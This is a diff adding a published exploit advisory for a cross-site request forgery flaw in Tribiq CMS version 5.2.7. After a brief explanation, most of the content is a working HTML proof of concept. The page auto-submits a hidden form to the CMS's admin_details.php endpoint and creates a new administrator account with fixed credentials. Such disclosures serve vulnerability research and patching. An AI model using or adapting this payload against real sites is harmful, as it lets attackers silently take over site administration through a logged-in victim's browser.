@@ -1,0 +1,42 @@
+###########################################################################################
+# Exploit Title: Tribq CMS CSRF - Adding/Editing new administrator account 
+# Date: 2013 8 August
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: http://sourceforge.net/projects/tribiq/
+# Tested on: Linux & Windows, PHP 5.2.9
+# Affected Version : 5.2.7
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir , http://Twitter.com/Mormoroth , http://mormoroth.ir }
+###########################################################################################
+
+Summary:
+========
+1. CSRF - Adding administrator account
+
+
+1. CSRF - Adding administrator account:
+=======================================
+From my standpoint, Tribq is a good CMS which is immune to many well-known vulnerabilities aside from CSRF. There are too many devastating actions may be done by hacker by conducting CSRF attack, although the critical ones are changing administrator password or adding new one. I provide an example of adding new administrator account, the attack can be done easily, afterwards, such a plain text may be appeared:
+
+{"adminId":20,"adminType":"local"}
+
+<html>
+	<body onload="submitForm()">
+	<form name="myForm" id="myForm"
+	action="http://localhost/community-5.2.7c/community-5.2.7c/tb/ajax/admin_details.php" method="post">
+	<input type="hidden" name="save" value="true">
+	<input type="hidden" name="adminType" value="local">
+	<input type="hidden" name="formMode" value="edit">
+	<input type="hidden" name="username" value="Yashar">
+	<input type="hidden" name="password" value="Yashar123">
+	<input type="hidden" name="password_reconfirm" value="Yashar123">
+	<input type="hidden" name="first_name" value="test">
+	<input type="hidden" name="last_name" value="test">
+	<input type="hidden" name="email" value="test@test.com">
+	</form>
+	<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+/** Yasshar shahinzadeh **/
